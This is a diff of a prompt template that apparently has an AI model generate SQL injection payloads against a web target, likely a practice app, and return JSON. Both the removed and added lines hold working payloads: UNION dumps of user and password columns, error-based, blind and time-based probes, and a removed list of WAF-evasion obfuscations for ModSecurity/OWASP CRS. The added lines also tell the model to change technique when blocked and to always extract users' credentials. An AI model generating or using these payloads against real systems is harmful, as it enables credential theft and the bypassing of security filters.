@@ -10,15 +10,13 @@ What you know about the target:
 - high: the value comes from a session variable and the query ends with `LIMIT 1`; use a comment to drop the limit, e.g. `1' UNION SELECT user, password FROM users -- -`
 - Useful building blocks: confirm injection first (`1'` to force an error, or `1' OR '1'='1' -- -`), then dump data with UNION. `group_concat(user,0x3a,password)` can pack many rows into one.
 
-WAF / filtering: the target may sit behind a Web Application Firewall (ModSecurity + OWASP CRS) that blocks requests matching common SQLi signatures with HTTP 403. When the feedback mentions "blocked", "WAF", "403" or "Forbidden", keep the SAME logical injection (a 2-column UNION dumping `user,password`) but OBFUSCATE it so the signature no longer matches. Prefer techniques that survive as literal SQL text (the HTTP client URL-encodes values for you, so do NOT hand-write %09/%0a or double-encoding):
-- Inline comments between keywords: `UN/**/ION SE/**/LECT`, `/**/UNION/**/SELECT/**/`.
-- Versioned comments: `/*!50000UNION*/ /*!50000SELECT*/`.
-- Mixed / random case: `uNiOn sElEcT`, `UnIoN aLl SeLeCt`.
-- `UNION ALL SELECT` instead of `UNION SELECT`.
-- Replace the space after commas/keywords with `/**/`, or group with parentheses.
-- Swap the comment terminator: use `#` instead of `-- -` (or `/**/` padding), and `||`/`&&` where OR/AND are filtered.
+IMPORTANT — emit CLEAN payloads, do NOT obfuscate. A separate deterministic layer handles all WAF evasion (inline/versioned comments, case, alternate whitespace, UNION ALL, comment terminators). Your payloads must be plain and valid: single ASCII spaces between tokens, no spaces inside quoted strings, and a `-- -` terminator. Never write `/**/`, mixed case, or encodings yourself — that is done for you.
+
+When feedback says payloads were blocked EVEN AFTER evasion, the problem is the CONTENT, not the surface: change the BASE TECHNIQUE instead of obfuscating. Options to rotate through:
+- A different injection class: error-based (`extractvalue(1,concat(0x3a,(SELECT ...)))`), boolean-blind (`1' AND 1=1 -- -` vs `1' AND 1=2 -- -`), or time-based (`1' AND sleep(3) -- -`).
+- A different column count or positions (the echoed columns may not be 1 and 2).
 - Pack the dump with `group_concat(user,0x3a,password)` to need fewer requests.
-ESCALATE: if feedback says a light obfuscation was still blocked, combine more techniques at once (comments + case + UNION ALL). Always still return exactly two columns.
+Always return the users' credentials as the goal, and for UNION keep exactly two columns.
 
 Respond ONLY with JSON of this exact shape, nothing else:
 {"strategy": "<one or two sentences>", "payloads": ["<payload1>", "<payload2>", "<payload3>"]}
